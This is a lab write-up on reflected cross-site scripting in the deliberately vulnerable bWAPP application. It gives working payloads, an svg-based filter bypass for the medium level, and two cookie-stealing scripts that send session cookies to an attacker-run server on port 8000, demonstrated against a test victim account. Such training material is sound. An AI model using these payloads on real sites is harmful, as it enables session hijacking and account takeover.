# Introduction
---

The Buggy Web Application (BWAPP) offers a set of challenges based on the ***Cross-Site Scripting (XSS) vulnerability***. (**A03:2021 - Injection**)

***SECURITY LEVELS COVERED***
- Low
- Medium

# Target

# Exploitation (phase 1)
---

Testing for Reflected XSS by passing a simple XSS payload in the `lastname` field through BurpSuite or directly on the client side:

#### Payload (Security level - low)

```HTML
<script>alert("Basic XSS")</script>
```

## BurpSuite

## Browser

## Result

The application is vulnerable to Reflected XSS. This vulnerability can be used to steal cookies of other users.

Note: For `medium` and `high` security levels in BWAPP, the payloads will differ due to implemented security measures.

## Exploitation (Phase 2)
---

An HTTP server can be set up using Python with the command:

```Bash
python3 -m http.server "port"
```

I didn't specify the port, and the server started on port `8000`.

When a user visits a URL with this payload embedded:

```HTML
<script> var pic = new Image(); pic.src = "http://0.0.0.0:8000/steal.php?cookie=" + document.cookie; </script>
```

Their cookies will be sent to the HTTP server running on port `8000`.

Visiting the URL as the default `bee/bug` user resulted in successful cookie theft:

(PHPSESSID contains a token used for user authentication)

Now let's simulate victim interaction:

![[images/XssReflectedMamont1.png]]

I created a victim user and used their credentials to log into BWAPP.

Once the victim follows the malicious link (which in the real world is typically provided through social engineering methods), the cookie value is sent to the attacker's server:

![[images/XssReflectedMamont2.png]]

It worked! The `Mamont` user's cookies were successfully compromised without their knowledge:

![[images/XssReflectedMamontCookie.png]]
(For clearer output, I restarted the server instance)

## Medium-level Approach
---

BWAPP at `medium` security level implements defense measures against basic XSS payloads:

```HTML
<script>alert("Basic XSS")</script>
```

However, the `svg`-based payload bypasses the filters, resulting in successful code execution:

```HTML
<svg onload=alert(1)>
```

### Medium-level cookie theft payload

This payload is similar to the low-level approach but uses `svg`:

```HTML
<svg xmlns="http://www.w3.org/2000/svg" onload="var pic=new Image(); pic.src='http://0.0.0.0:8000/steal.php?cookie=' + document.cookie;">
</svg>
```
